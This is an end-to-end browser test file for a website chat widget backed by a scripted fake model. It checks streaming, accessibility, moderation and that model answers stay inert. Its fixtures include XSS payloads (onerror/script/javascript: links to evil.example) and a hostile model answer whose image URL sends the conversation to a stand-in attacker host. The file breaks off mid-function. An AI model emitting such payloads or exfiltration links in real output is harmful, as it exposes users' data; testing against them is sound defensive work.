/**
 * The chat block end to end, in real browsers (chat-block-spec §12, C1): a
 * site with two chat panels, built by the real CLI and served as it ships;
 * the server `az build` generated for it, started as its own process with
 * the `fake` model adapter replaying scripted answers — so every run is
 * deterministic and no model is called.
 *
 *     pnpm test:chat
 *
 * In Chromium, Firefox and WebKit, over https (the site and the server's
 * TLS proxy use a certificate made at test time, lib/self-signed.mjs):
 *
 *   - signed out, the default `signedin` panel offers Sign in to ask and the
 *     server refuses the page's own request (401 signin_required);
 *   - an `allow anyone` panel streams an answer, as text in paragraphs,
 *     `aria-busy` while it streams; a follow-up carries the tagged history;
 *     past `limit` the panel says the chat is full and New chat starts over;
 *   - signed in, a suggested question asks itself;
 *   - an answer full of markup, images and links stays literal text: no
 *     element, no request anywhere but the site and the backend;
 *   - Stop (Escape) ends a stalled answer; a failed one offers Try again;
 *   - the status region hears sentences, not tokens: a long answer's
 *     updates are few;
 *   - keyboard: Tab reaches the input, Enter sends, Shift+Enter is a new
 *     line, focus stays in the input;
 *   - axe in every state; no Content-Security-Policy violation anywhere;
 *   - and the server's log never holds a visitor's or the model's words.
 *
 * C2b (§20.9), on /figures, whose site has a public `orders` table and a
 * gallery: a dashboard with a server chart and a model chart — the
 * "AI-generated figures" label on the model's figures only, the site's
 * figures captioned with their source; a pie, a sortable table, stat cards
 * and an image card; the rich injection corpus (NaN, a private field, an
 * image address, an off-list link) drawn as filtered; axe in each state; a
 * share link made from an answer, opened signed out in a fresh context with
 * the same components and labels and `noindex`, gone after its delete link
 * is used and after it expires.
 *
 * C3 (§14, §9): a `chat float` under `site` with `knows guides` (a public
 * table only the site fills, with a private column): the launcher on every
 * page that has no chat of its own and on none that says `chat none`; by
 * keyboard, it opens a side panel above `sm` that does not hold focus and a
 * bottom sheet below it that does (Tab and Shift+Tab stay inside), the input
 * focused on opening and the launcher on closing; Escape stops an answer,
 * then closes; the answer is the one the model gives only when the guides
 * row reached it and the private column did not; the transcript stops
 * following when scrolled up and offers Jump to latest, which brings it back
 * to the end; under reduced motion the panel only fades and the jump is
 * instant; an answer with components is a stop in the Tab order; axe in
 * every float state. Then, in Chromium, pixel snapshots of the answered
 * states — the float wide and as a sheet, an answer with the site's
 * components, a dashboard — in every theme and both schemes: each rendered
 * twice from a fresh page and byte-compared (the fake adapter makes them
 * deterministic), light and dark told apart, the PNGs written to
 * .visual-out/chat/ for review.
 *
 * C4 (§14, §6.8, §11.4): every question passes the server's moderation hook,
 * a local endpoint here speaking its shape; a question it blocks is refused
 * in each engine with the panel's fixed copy and never reaches the model,
 * and the next question is answered; the operator's usage view on /admin —
 * a verified account listed in AZ_ADMIN_EMAILS — shows today's counts with
 * no visitor's words, axe-clean; another signed-in account is refused it
 * (403) by the server.
 */
import { DatabaseSync } from 'node:sqlite';
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';

import { createServer as createHttpServer, request as httpRequest } from 'node:http';
import { createServer as createHttpsServer, request as httpsRequest } from 'node:https';
import { createServer as createNetServer } from 'node:net';
import { spawn } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { extname, join, normalize, sep } from 'node:path';
import { chromium, firefox, webkit } from 'playwright';
import AxeBuilder from '@axe-core/playwright';
import { CLI, ROOT, buildSites } from './visual/pipeline.mjs';
import { closeWithin, watchdog, human } from './lib/bounded.mjs';
import { cspResult, violationControl, watchedContext } from './visual/csp.mjs';
import { selfSignedCert } from './lib/self-signed.mjs';
import { chunksOf, corpusCases, corpusRules } from '../packages/backend/test/chat-corpus.ts';
import { THEMES, DEFAULT_THEME } from '../packages/theme/src/index.ts';

/*
 * Deadlines (lib/bounded.mjs): a normal run takes a few minutes — six theme
 * builds and the snapshots (C3) are most of it; 25 minutes is several times
 * the slowest measured, so only a stuck engine reaches it.
 */
const RUN_MS = 25 * 60_000;
const CLOSE_MS = 15_000;
const CONTROL_MS = 10_000;
/** The longest any one UI state is waited for. */
const STATE_MS = 15_000;
const progress = { last: 'starting' };
const run = watchdog(RUN_MS, 'test:chat', progress);
console.log(`deadlines: run ${human(RUN_MS)} · state ${human(STATE_MS)} · close ${human(CLOSE_MS)}`);
let closed = true;
const csp = {};

let failures = 0;
const check = (name, pass, detail = '') => {
  if (!pass) failures++;
  progress.last = name;
  console.log(`${pass ? 'PASS ' : 'FAIL '} ${name}${detail ? `   ${detail}` : ''}`);
};

/** Words planted in a question and in an answer: the server's log must never hold either. */
const VISITOR_MARK = `visitor-mark-${randomBytes(4).toString('hex')}`;
const ANSWER_MARK = `answer-mark-${randomBytes(4).toString('hex')}`;
const HOSTILE = '<img src="https://evil.example/x.png" onerror="alert(1)"><script>alert(2)</script> ![x](https://evil.example/?q=1) [click](javascript:alert(3))';

const SITE = `az 1

site lantern
  auth
    adapter azbackend
  backend
    database sqlite
    email    smtp
    model    default

page /
  hero center
    title "Lantern"
    cta   "Docs" https://docs.lantern.example/start
    alt   "Mail us" mailto:help@lantern.example
  chat panel
    title    "Ask Lantern"
    greeting "Hi! Ask me about the lamps."
    ask      "How bright is it?"
    ask      "Does it ship abroad?"

page /open
  hero center
    title "Open chat"
  chat panel
    title    "Ask anyone"
    greeting "Anyone may ask here."
    allow    anyone
    limit    3

page /ask
  hero center
    title "Ask about Lantern"
  chat panel
    title    "Ask about plans"
    greeting "Ask me anything about Lantern."
    show     pricing faq cta feature
    allow    anyone
    limit    50

page /pricing
  hero center
    title "Pricing"
  pricing cards
    title    "Plans"
    currency usd
    plan "Home"
      monthly 9
      annual  90
      cta     "Start" /signup
    plan "Studio"
      monthly 29
      annual  290
      cta     "Start" /signup

page /contact
  text
    title "Contact"
    body  "Write to us."

page /signup
  chat none
  auth signup
    terms /terms
    alt   "Sign in instead" /login

page /terms
  text
    title "Terms"
    body  "Plain terms."

page /login
  auth login
    redirect /
    alt      "Create an account" /signup
`;

/** C2b's page (§20.9): a gallery whose image a card may show, and a chat that shows every rich component. */
const FIGURES = `
page /figures
  hero center
    title "Orders"
  gallery grid
    image ./preview-assets/assets/bench.webp
      alt "An empty workbench under a single lamp"
    image ./preview-assets/assets/welt.webp
      alt "A welt being stitched by hand"
  chat panel
    title    "Ask about orders"
    greeting "Ask me for figures."
    show     chart table stats cards dashboard
    allow    anyone
    limit    50
`;

/** The public table the server counts (chat-block-spec §20.5): a private note it must never read. */
const DATA = `
  data guides
    title    text     required search
    body     longtext required search
    secret   text     private
    allow anyone read
  data orders
    item     text     required
    status   choice   paid open cancelled required
    total    money    usd required
    placed   datetime required
    note     text     private
    allow anyone read
    allow anyone create
`;
/** C3 (§3.1, §8.2): the float every page without a chat of its own shows, grounded on the guides table. */
const FLOAT = `
  chat float
    title    "Ask Lantern"
    greeting "Hi! Ask me anything about Lantern."
    allow    anyone
    limit    50
    knows    guides
`;
/** The guides rows, written as the site's admin writes them: a private column the model must never be given. */
const GUIDE_SECRET = `guide-secret-${randomBytes(4).toString('hex')}`;
const GUIDES = [
  { title: 'Warranty', body: 'Every Lantern lamp has a lifetime warranty on the frame.' },
  { title: 'Bulbs', body: 'Lantern takes any E27 bulb up to 12 watts.' },
];
/** The paragraphs of the long answer the transcript must stop following when scrolled up. */
const SCROLL_PARAGRAPHS = 40;
const ORDERS = [
  { item: 'Lamp', status: 'paid', total: 4500, placed: Date.UTC(2026, 8, 3), note: 'private-mark-one' },
  { item: 'Desk lamp', status: 'paid', total: 6900, placed: Date.UTC(2026, 9, 1), note: 'private-mark-two' },
  { item: 'Bulb', status: 'open', total: 900, placed: Date.UTC(2026, 9, 2) },
  { item: 'Shade', status: 'cancelled', total: 1500, placed: Date.UTC(2026, 9, 5) },
  { item: 'Cable', status: 'paid', total: 300, placed: Date.UTC(2026, 9, 7) },
];

/** The rich answers (§20.3): a dashboard with a server chart and a model chart, a mix of every other component, an attack. */
const RICH = {
  dashboard: [
    'Here is October at a glance.',
    'dashboard "This month"',
    '  stat "Orders" from orders count by placed month',
    '  chart bar "Orders by status" from orders count by status',
    '  chart line "Expected next quarter"',
    '    point "Nov" 140',
    '    point "Dec" 180',
    '    point "Jan" 120',
    '',
    'The last chart is my own estimate, not your data.',
  ].join('\n'),
  mix: [
    'Some figures.',
    'chart pie "Revenue by status" from orders sum total by status',
    'table "Plans" sortable',
    '  columns "Plan" "Seats"',
    '  row "Team" 10',
    '  row "Business" 50',
    '  row "Solo" 1',
    'stats',
    '  stat "Conversion" 3.2 unit percent delta 0.4',
    'cards',
    '  card "The workbench"',
    '    image i1',
    '    text "Where every lamp is made."',
    '    link "Contact us" /contact',
  ].join('\n'),
  attack: [
    'Attack figures.',
    'chart bar "Forged" src site',
    '  point "a" NaN',
    'chart bar "Private" from orders count by note',
    'cards',
    '  card "Leaky"',
    '    image https://evil.example/collect.png?d=conversation',
    '    text "No image here."',
    'table "Huge" from orders columns item note',
  ].join('\n'),
};

/** The injection corpus (packages/backend/test/fixtures/chat-attacks/): each hostile answer, and the rules it is judged on. */
const CORPUS = corpusCases();
const RULES = corpusRules();

/** The fake model's script (AZ_CHAT_FAKE_FILE): the first entry whose `when` the question holds — the corpus first. */
const FAKE = {
  answers: [
    ...CORPUS.map((c) => ({ when: c.ask, chunks: chunksOf(c.answer), delayMs: 5 })),
    // §8.2: the grounded answer comes only when the guides row is in what the model was given — and the probe first, should the private column ever be.
    { when: 'warranty', system: GUIDE_SECRET, chunks: ['LEAKED the private column.'] },
    { when: 'warranty', system: 'lifetime warranty on the frame', chunks: ['Every lamp has a lifetime ', 'warranty on its frame.'], delayMs: 10 },
    { when: 'warranty', chunks: ['NOT GROUNDED.'] },
    { when: 'scroll please', chunks: Array.from({ length: SCROLL_PARAGRAPHS }, (_, i) => `Paragraph ${i + 1} of the long answer.\n\n`), delayMs: 40 },
    { when: 'figures-dashboard', chunks: chunksOf(RICH.dashboard), delayMs: 5 },
    { when: 'figures-mix', chunks: chunksOf(RICH.mix), delayMs: 5 },
    { when: 'figures-attack', chunks: chunksOf(RICH.attack), delayMs: 5 },
    { when: 'bright', chunks: ['It is bright: ', '800 lumens. ', 'Dimmable too.'], delayMs: 20 },
    { when: VISITOR_MARK, chunks: [`Planted ${ANSWER_MARK}. `, 'Second sentence.', '\n\nA new paragraph.'], delayMs: 20 },
    { when: 'hostile', chunks: [HOSTILE] },
    { when: 'stall', chunks: ['Starting', ' slowly'], stall: true },
    { when: 'fail', chunks: [], fail: 500 },
    // ~400 tokens, a sentence every 20 words: the status region must hear few updates, not 400.
    { when: 'long', chunks: Array.from({ length: 400 }, (_, i) => (i % 20 === 19 ? 'word. ' : 'word ')), delayMs: 3 },
    { chunks: ['A plain answer. ', 'Ask me anything else.'], delayMs: 10 },
  ],
};

const tls = selfSignedCert();
const CONTEXT = { ignoreHTTPSErrors: true };
const FETCH_MS = 15_000;

/** A Node-side https request that trusts the test's certificate (the server's health). */
const fetch = (url, init = {}) => new Promise((done, fail) => {
  const req = httpsRequest(url, { method: init.method ?? 'GET', headers: init.headers, ca: tls.cert, timeout: FETCH_MS }, (res) => {
    const chunks = [];
    res.on('data', (c) => chunks.push(c));
    res.on('error', fail);
    res.on('end', () => done({ ok: (res.statusCode ?? 0) < 400, status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
  });
  req.on('timeout', () => req.destroy(new Error(`no answer after ${FETCH_MS / 1000}s: ${url}`)));
  req.on('error', fail);
  req.end(init.body);
});

/** Each engine as its own client address (TEST-NET-1), told by its user agent, so per-address limits count each apart. */
const CLIENT_ADDRESSES = [[/Firefox\//, '192.0.2.2'], [/Chrome\//, '192.0.2.1'], [/AppleWebKit\//, '192.0.2.3']];

/** TLS in front of the server's plain port, appending X-Forwarded-For as a deployment's proxy does; streams pass through. */
function startTlsProxy(port) {
  const server = createHttpsServer(tls, (req, res) => {
    const client = CLIENT_ADDRESSES.find(([agent]) => agent.test(req.headers['user-agent'] ?? ''))?.[1] ?? req.socket.remoteAddress;
    const forwarded = [req.headers['x-forwarded-for'], client].filter(Boolean).join(', ');
    const upstream = httpRequest({ host: '127.0.0.1', port, method: req.method, path: req.url, headers: { ...req.headers, 'x-forwarded-for': forwarded } }, (answer) => {
      res.writeHead(answer.statusCode ?? 502, answer.headers);
      answer.pipe(res);
    });
    upstream.on('error', () => { if (res.headersSent) res.destroy(); else res.writeHead(502).end(); });
    // The visitor went away (Stop): the server must see it too.
    res.on('close', () => { if (!res.writableFinished) upstream.destroy(); });
    req.pipe(upstream);
  });
  return new Promise((done) => server.listen(0, '127.0.0.1', () =>
    done({ url: `https://localhost:${server.address().port}`, close: () => server.close() })));
}

function startSite(root) {
  const server = createHttpsServer(tls, async (req, res) => {
    const path = decodeURIComponent(new URL(req.url ?? '/', 'http://x').pathname);
    for (const rel of extname(path) ? [path] : [join(path, 'index.html')]) {
      const file = normalize(join(root, rel));
      if (!file.startsWith(root + sep)) break;
      try {
        const body = await readFile(file);
        const type = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css' }[extname(file)] ?? 'application/octet-stream';
        res.writeHead(200, { 'content-type': type }).end(body);
        return;
      } catch { /* next candidate */ }
    }
    res.writeHead(404).end();
  });
  return new Promise((done) => server.listen(0, '127.0.0.1', () =>
    done({ url: `https://localhost:${server.address().port}`, close: () => server.close() })));
}

const freePort = () => new Promise((done) => {
  const probe = createNetServer();
  probe.listen(0, '127.0.0.1', () => { const { port } = probe.address(); probe.close(() => done(port)); });
});

/** The moderation hook's other side (chat-block-spec §6.8): POST { text } → { allow }; it blocks what holds MODERATE_BLOCK. */
const MODERATE_BLOCK = 'moderate-block';
function startModeration() {
  const seen = { asked: 0, blocked: 0 };
  const server = createHttpServer((req, res) => {
    let body = '';
    req.setEncoding('utf8');
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      let text = '';
      try { text = String(JSON.parse(body).text ?? ''); } catch { /* answered as a block below */ }
      const allow = text !== '' && !text.includes(MODERATE_BLOCK);
      seen.asked++;
      if (!allow) seen.blocked++;
      res.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ allow }));
    });
  });
  return new Promise((done) => server.listen(0, '127.0.0.1', () =>
    done({ url: `http://127.0.0.1:${server.address().port}/check`, seen, close: () => server.close() })));
}

/** The site's admins (data-spec §11), one per engine: their accounts are made, then verified, in adminFlow. */
const ENGINES = ['chromium', 'firefox', 'webkit'];
const adminEmail = (engine) => `admin-${engine}@lantern.test`;

/** An SMTP listener that accepts and drops: sign-up sends no mail, but the server needs a relay to start. */
function startSmtpSink() {
  const server = createNetServer((socket) => {
    socket.setEncoding('utf8');
    socket.write('220 sink\r\n');
    let data = false;
    socket.on('data', (chunk) => {
      for (const line of chunk.split('\r\n')) {
        if (data) { if (line === '.') { data = false; socket.write('250 ok\r\n'); } continue; }
        if (/^DATA/i.test(line)) { data = true; socket.write('354 go\r\n'); } else if (/^QUIT/i.test(line)) socket.end('221 bye\r\n'); else if (line) socket.write('250 ok\r\n');
      }
    });
  });
  return new Promise((done) => server.listen(0, '127.0.0.1', () => done({ port: server.address().port, close: () => server.close() })));
}

const work = mkdtempSync(join(tmpdir(), 'az-chat-e2e-'));
const serverPort = await freePort();
const proxy = await startTlsProxy(serverPort);
process.env.AZ_PUBLIC_BACKEND_URL = proxy.url;
// A site with tables builds with its schema lock, written by the real `az backend schema` (data-spec §6).
const SOURCE = `${SITE.replace('    model    default\n', `    model    default\n${DATA}${FLOAT}`)}${FIGURES}`;
const ASSETS = join(ROOT, 'packages/words/gallery/preview-assets');
const site = { dir: join(work, 'lantern'), source: SOURCE, assetsFrom: ASSETS };
/*
 * C3's snapshots (§12): the same site in every other theme, so each answered
 * state is drawn by each theme. Same pages, same chats, same tables — the one
 * server below answers all of them; only `theme` differs.
 */
const themed = Object.keys(THEMES).filter((t) => t !== DEFAULT_THEME).map((theme) => ({
  theme, dir: join(work, `lantern-${theme}`), source: SOURCE.replace('site lantern\n', `site lantern\n  theme ${theme}\n`), assetsFrom: ASSETS,
}));
for (const s of [site, ...themed]) {
  mkdirSync(s.dir, { recursive: true });
  writeFileSync(join(s.dir, 'site.az'), s.source);
  execFileSync(process.execPath, [CLI, 'backend', 'schema', join(s.dir, 'site.az')], { cwd: s.dir, env: { ...process.env, AZ_PUBLIC_BACKEND_URL: proxy.url }, stdio: 'pipe' });
}
await buildSites([site, ...themed], work);
check('the chat site compiles and builds', Boolean(site.compiled && site.dist), site.error ?? '');
check(`the same site builds in the other ${themed.length} themes`, themed.every((s) => s.compiled && s.dist), themed.filter((s) => !s.dist).map((s) => `${s.theme}: ${s.error ?? 'no dist'}`).join(' | '));
if (!site.dist || !themed.every((s) => s.dist)) {
  console.log(`\n1 CHECK(S) FAILED — work dir kept: ${work}`);
  run.clear();
  process.exit(1);
}

const smtp = await startSmtpSink();
const moderation = await startModeration();
const host = await startSite(normalize(site.dist));
/** Each theme's copy on its own origin, the default theme's being the main site. */
const themeHosts = [{ theme: DEFAULT_THEME, url: host.url, close: host.close }];
for (const s of themed) themeHosts.push({ theme: s.theme, ...(await startSite(normalize(s.dist))) });
const serverDir = join(site.proj, 'server');
mkdirSync(join(serverDir, 'node_modules'), { recursive: true });
symlinkSync(realpathSync(join(ROOT, 'node_modules/nodemailer')), join(serverDir, 'node_modules/nodemailer'), 'dir');
const fakeFile = join(work, 'fake-model.json');
writeFileSync(fakeFile, JSON.stringify(FAKE));
// The corpus is judged on the rules this site's build wrote: they must be the fixtures' rules.json.
{
  const context = JSON.parse(await readFile(join(serverDir, 'chat/context.json'), 'utf8'));
  const { destinations, quotes } = context.answer ?? {};
  const same = JSON.stringify({ destinations, quotes }) === JSON.stringify({ destinations: RULES.destinations, quotes: RULES.quotes.map(({ n, route, word }) => ({ n, route, word })) })
    && JSON.stringify(context.chats['/ask']?.show) === JSON.stringify(RULES.show);
  check('the built server\'s chat context is the corpus\'s rules (show, quotes, destinations)', same, JSON.stringify({ answer: context.answer, show: context.chats['/ask']?.show }));
}
const child = spawn(process.execPath, ['src/main.ts'], {
  cwd: serverDir,
  env: {
    PATH: process.env.PATH,
    AZ_SESSION_SECRET: randomBytes(32).toString('base64url'),
    AZ_BACKEND_PUBLIC_URL: proxy.url, AZ_PORT: String(serverPort), AZ_ALLOWED_ORIGINS: themeHosts.map((h) => h.url).join(','), AZ_TRUST_PROXY: 'true',
    AZ_SQLITE_PATH: join(serverDir, 'data/test.db'),
    AZ_EMAIL_FROM: 'Lantern <no-reply@lantern.test>', AZ_SMTP_HOST: '127.0.0.1', AZ_SMTP_PORT: String(smtp.port),
    AZ_CHAT_API: 'fake', AZ_CHAT_FAKE_FILE: fakeFile,
    AZ_CHAT_MODERATION_URL: moderation.url,
    AZ_ADMIN_EMAILS: ENGINES.map(adminEmail).join(','),
    // Three engines ask the whole corpus: room for it under the per-address limit and the day's budget.
    AZ_CHAT_PER_ADDRESS: '500/hour', AZ_CHAT_DAILY_TOKENS: '100000000',
  },
  stdio: ['ignore', 'pipe', 'pipe'],
});
progress.children = [child];
let serverLog = '';
child.stdout.on('data', (c) => { serverLog += c; });
child.stderr.on('data', (c) => { serverLog += c; });
const up = await new Promise((done) => {
  const until = Date.now() + 15_000;
  const retry = () => (Date.now() > until ? done(false) : setTimeout(poll, 200));
  const poll = () => fetch(`${proxy.url}/health`).then((r) => (r.ok ? done(true) : retry()), retry);
  poll();
});
check('the generated server starts with the fake model adapter', up, serverLog.trim().split('\n').slice(0, 4).join(' / '));
if (!up) {
  child.kill('SIGTERM');
  proxy.close(); smtp.close(); moderation.close();
  for (const h of themeHosts) h.close();
  console.log(`\n1 CHECK(S) FAILED — work dir kept: ${work}`);
  run.clear();
  process.exit(1);
}

// The guides a chat knows (§8.2): only the site's admins fill that table, so they are written into its database as an admin's would be.
{
  const db = new DatabaseSync(join(serverDir, 'data/test.db'));
  try {
    const insert = db.prepare('INSERT INTO azd_guides (id, owner, created, updated, title, body, secret) VALUES (?, NULL, ?, ?, ?, ?, ?)');
    GUIDES.forEach((g, i) => insert.run(`00000000-0000-4000-8000-${String(i + 1).padStart(12, '0')}`, i + 1, i + 1, g.title, g.body, GUIDE_SECRET));
  } finally { db.close(); }
}

// The orders the server's figures count, made as any visitor makes rows (allow anyone create).
for (const order of ORDERS) {
  const r = await fetch(`${proxy.url}/data/orders`, {
    method: 'POST', headers: { origin: host.url, 'content-type': 'application/json', 'x-az-request': '1' }, body: JSON.stringify(order),
  });
  if (r.status !== 201) check(`the orders table takes the test rows`, false, `${r.status} ${r.text}`);
}

const PASSWORD = 'correct-horse-battery';
const backendOrigin = new URL(proxy.url).origin;

/** Every request a page makes, by origin — anything but the site and the backend fails the run. */
function recordRequests(page, seen) {
  page.on('request', (r) => {
    const u = r.url();
    if (u.startsWith('data:') || u.startsWith('blob:')) return;
    seen.add(new URL(u).origin);
  });
}

async function signUp(page, name, email = `${name.toLowerCase()}-${randomBytes(3).toString('hex')}@lantern.test`) {
  await page.goto(`${host.url}/signup`);
  const form = page.locator('form[data-flow="signup"]');
  await form.locator('input[name="name"]').fill(name);
  await form.locator('input[name="email"]').fill(email);
  await form.locator('input[name="password"]').fill(PASSWORD);
  await form.locator('input[name="passwordConfirm"]').fill(PASSWORD);
  await form.locator('input[name="terms"]').check();
  await form.getByRole('button', { name: 'Create account' }).click();
  await page.waitForURL((u) => !u.pathname.startsWith('/signup'), { timeout: STATE_MS });
}

const panel = (page) => page.locator('[data-az-chat]');
/** Wait until the panel's runtime has decided who may ask. */
const ready = (page, state = 'idle') => page.waitForFunction((s) => document.querySelector('[data-az-chat]')?.getAttribute('data-az-chat-state') === s
  && document.documentElement.hasAttribute('data-az-ready'), state, { timeout: STATE_MS });
/** How many site messages the transcript holds (the greeting is one). */
const answerCount = (page) => page.evaluate(() => document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site').length);
/** The answer after the `before`-th, once it is no longer busy: its paragraphs, and how many elements in it are not one. */
async function nextAnswer(page, before) {
  await page.waitForFunction((n) => {
    const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
    return items.length > n && items[items.length - 1].getAttribute('aria-busy') === 'false';
  }, before, { timeout: STATE_MS });
  return page.evaluate(() => {
    const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
    const last = items[items.length - 1];
    return {
      paragraphs: [...last.querySelectorAll(':scope > p')].map((p) => p.textContent),
      elements: [...last.querySelectorAll('*')].filter((e) => !(e.tagName === 'P' && e.parentElement === last)).length,
    };
  });
}
/** Send `text` from the input with Enter, and its answer. */
async function ask(page, text) {
  const before = await answerCount(page);
  const input = panel(page).locator('[data-az-chat-input]');
  await input.fill(text);
  await input.press('Enter');
  return nextAnswer(page, before);
}
/** axe on the page as it is: zero violations. */
async function axe(page, label) {
  const r = await new AxeBuilder({ page }).analyze();
  check(`${label}: axe finds no violation`, r.violations.length === 0, r.violations.map((v) => `${v.id} (${v.nodes.length}: ${v.nodes.slice(0, 2).map((n) => `${n.target.join(' ')} ${n.any[0]?.message ?? ''}`.slice(0, 220)).join(' | ')})`).join(', '));
}
/** Count what the status region is told while `work` runs. */
async function announcements(page, work) {
  await page.evaluate(() => {
    const status = document.querySelector('[data-az-chat-status]');
    globalThis.azSaid = [];
    new MutationObserver(() => { if (status.textContent) globalThis.azSaid.push(status.textContent); })
      .observe(status, { childList: true, characterData: true, subtree: true });
  });
  await work();
  return page.evaluate(() => globalThis.azSaid);
}

async function anonymousFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    page.on('dialog', (d) => { check(`${name}: no dialog ever opens`, false, d.message()); void d.dismiss(); });

    // The default panel: signed-in visitors only.
    await page.goto(`${host.url}/`);
    await ready(page, 'signin');
    check(`${name}: signed out, the default panel offers Sign in to ask and hides the form`,
      await panel(page).locator('[data-az-chat-signin]').isVisible() && !(await panel(page).locator('[data-az-chat-form]').isVisible())
      && await panel(page).getByText('Hi! Ask me about the lamps.').isVisible());
    await axe(page, `${name} signed out`);
    const refused = await page.evaluate(async (base) => {
      const r = await fetch(`${base}/chat`, {
        method: 'POST', credentials: 'include', headers: { 'content-type': 'application/json', 'x-az-request': '1' },
        body: JSON.stringify({ page: '/', messages: [{ role: 'visitor', text: 'hello' }] }),
      });
      return { status: r.status, body: await r.json() };
    }, proxy.url);
    check(`${name}: the server refuses an anonymous question on a signedin chat (401 signin_required)`,
      refused.status === 401 && refused.body.error === 'signin_required', JSON.stringify(refused));

    // The open panel: anyone may ask.
    await page.goto(`${host.url}/open`);
    await ready(page);
    await axe(page, `${name} idle`);
    // Keyboard: Tab reaches the input; Shift+Enter is a new line; Enter sends; focus stays.
    const input = panel(page).locator('[data-az-chat-input]');
    let reached = false;
    for (let i = 0; i < 40 && !reached; i++) {
      await page.keyboard.press('Tab');
      reached = await input.evaluate((el) => el === document.activeElement);
    }
    check(`${name}: Tab reaches the question input`, reached);
    await page.keyboard.type(`First line ${VISITOR_MARK}`);
    await page.keyboard.press('Shift+Enter');
    await page.keyboard.type('second line');
    check(`${name}: Shift+Enter is a new line, not a send`, (await input.inputValue()) === `First line ${VISITOR_MARK}\nsecond line`);
    const before = await answerCount(page);
    const said = await announcements(page, async () => {
      await page.keyboard.press('Enter');
      const busy = await page.waitForFunction(() => document.querySelector('.az-chat-transcript > .az-chat-message--site:last-child')?.getAttribute('aria-busy') === 'true', null, { timeout: STATE_MS }).then(() => true, () => false);
      check(`${name}: the answer is aria-busy while it streams`, busy);
      const answer = await nextAnswer(page, before);
      check(`${name}: the answer streams in as text, in paragraphs`,
        JSON.stringify(answer.paragraphs) === JSON.stringify([`Planted ${ANSWER_MARK}. Second sentence.`, 'A new paragraph.']),
        JSON.stringify(answer.paragraphs));
    });
    check(`${name}: focus stayed in the input`, await input.evaluate((el) => el === document.activeElement));
    check(`${name}: the status region heard whole sentences`, said.length > 0 && said.every((s) => /[.!?]$/.test(s)), JSON.stringify(said));
    await axe(page, `${name} answered`);

    // A follow-up sends the tagged history; the server accepts it (no `tampered`).
    const hostile = await ask(page, 'And hostile?');
    check(`${name}: markup, images and links in an answer stay literal text — no element made`,
      hostile.paragraphs.join('') === HOSTILE && hostile.elements === 0, JSON.stringify(hostile));
    check(`${name}: nothing in the transcript is an image, script or link`,
      await page.locator('[data-az-chat-transcript] :is(img, script, a, iframe)').count() === 0);

    // The third question of three; after it the chat is full.
    await ask(page, 'One more?');
    await page.waitForFunction(() => document.querySelector('[data-az-chat]')?.getAttribute('data-az-chat-state') === 'full', null, { timeout: STATE_MS });
    check(`${name}: past limit the panel says the chat is full and offers New chat`,
      await panel(page).getByText('This chat is full').isVisible() && await panel(page).locator('[data-az-chat-reset]').isVisible()
      && !(await panel(page).locator('[data-az-chat-form]').isVisible()));
    await panel(page).locator('[data-az-chat-reset]').click();
    await ready(page);
    check(`${name}: New chat starts over with the greeting alone`,
      await panel(page).locator('[data-az-chat-transcript] > li').count() === 1 && await panel(page).locator('[data-az-chat-form]').isVisible());

    // Stop: Escape ends a stalled answer.
    await input.fill('stall please');
    await input.press('Enter');
    await panel(page).locator('[data-az-chat-stop]').waitFor({ state: 'visible', timeout: STATE_MS });
    await page.keyboard.press('Escape');
    await page.waitForFunction(() => document.querySelector('[data-az-chat-note]')?.textContent === 'Stopped.', null, { timeout: STATE_MS });
    check(`${name}: Escape stops an answer; the panel says so and Send is back`,
      await panel(page).locator('[data-az-chat-send]').isVisible() && !(await panel(page).locator('[data-az-chat-stop]').isVisible()));

    // A failure offers Try again, in fixed copy.
    await input.fill('fail now');
    await input.press('Enter');
    await panel(page).locator('[data-az-chat-retry]').waitFor({ state: 'visible', timeout: STATE_MS });
    check(`${name}: a failed answer says so in fixed copy, with Try again`,
      (await panel(page).locator('[data-az-chat-error]').textContent()) === 'The answer could not be finished — try again.');
    await axe(page, `${name} error`);

    // A long answer, asked instead of trying again: few status updates, not one per token.
    const long = await announcements(page, () => ask(page, 'a long answer please'));
    check(`${name}: a 400-token answer reaches the status region in a few updates, not 400`, long.length >= 1 && long.length <= 12, `${long.length} updates`);
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} anonymous context close`)) && closed;
  }
}

async function signedInFlow(b, name, origins) {
  const ctx = await watchedContext(b, csp, CONTEXT);
  try {
    const page = await ctx.newPage();
    recordRequests(page, origins);
    await signUp(page, `Chat${name}`);
    await page.goto(`${host.url}/`);
    await ready(page);
    check(`${name}: signed in, the default panel shows its form and suggestions`,
      await panel(page).locator('[data-az-chat-form]').isVisible() && await panel(page).locator('[data-az-chat-asks]').isVisible());
    const before = await answerCount(page);
    await panel(page).getByRole('button', { name: 'How bright is it?' }).click();
    const answer = await nextAnswer(page, before);
    check(`${name}: a suggested question asks itself and is answered`,
      answer.paragraphs.join('') === 'It is bright: 800 lumens. Dimmable too.', JSON.stringify(answer.paragraphs));
    check(`${name}: the suggestions are gone once a question is asked`, !(await panel(page).locator('[data-az-chat-asks]').isVisible()));
    await axe(page, `${name} signed in, answered`);
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `${name} signed-in context close`)) && closed;
  }
}

/* ---- C2: components and the injection corpus, through the real page ---- */

/** The paragraphs the page draws from a piece of prose (overlay chat.ts paragraphsOf). */
const paragraphsOf = (text) => text.split(/\n{2,}/).map((p) => p.replace(/^\n+|\n+$/g, '')).filter((p) => p !== '');

/** What the last answer shows, in order: its paragraphs and its parts, each read back from the DOM as a visitor's browser has it. */
const lastAnswer = (page) => page.evaluate(() => {
  const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
  const last = items[items.length - 1];
  // The Share control under a finished answer (§20.7) is the panel's, not the answer's: it is left out here.
